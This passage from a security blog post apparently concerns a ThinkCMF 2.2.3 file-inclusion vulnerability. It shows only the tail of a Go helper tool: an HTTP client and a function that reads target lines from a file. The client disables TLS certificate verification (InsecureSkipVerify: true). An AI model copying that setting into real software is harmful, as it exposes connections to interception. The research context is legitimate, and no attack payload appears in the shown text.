TLSHandshakeTimeout: time.Duration(timeout) * time.Second,</span><br><span class="line">		TLSClientConfig:     &amp;tls.Config&#123;InsecureSkipVerify: true&#125;&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 主要是这里构造超时</span><br><span class="line">	client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">		Timeout:   time.Duration(timeout) * time.Second,</span><br><span class="line">		Transport: tr,</span><br><span class="line">	&#125;</span><br><span class="line">	return client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func readLines(path string) ([]string, int, error) &#123;</span><br><span class="line">  file, err :&#x3D; os.Open(path)</span><br><span class="line">  if err !&#x3D; nil &#123;</span><br><span class="line">    return nil,0, err</span><br><span class="line">  &#125;</span><br><span class="line">  defer file.Close()</span><br><span class="line"></span><br><span class="line">  var lines []string</span><br><span class="line">  linecount :&#x3D;0</span><br><span class="line">  scanner :&#x3D; bufio.NewScanner(file)</span><br><span class="line">  for scanner.Scan() &#123;</span><br><span class="line">    lines &#x3D; append(lines, scanner.Text())</span><br><span class="line">    linecount++</span><br><span class="line">  &#125;</span><br><span class="line">  return lines,linecount,scanner.Err()</span><br></pre></td></tr></table></figure>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>ShangZeng</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.shangzeng.club/2020/12/14/thincmf2-2-3%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://www.shangzeng.club/2020/12/14/thincmf2-2-3%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY<strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/php/"># php</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2020/11/16/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0webshell-jsp/">从零开始学习webshell-jsp</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© ShangZeng | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
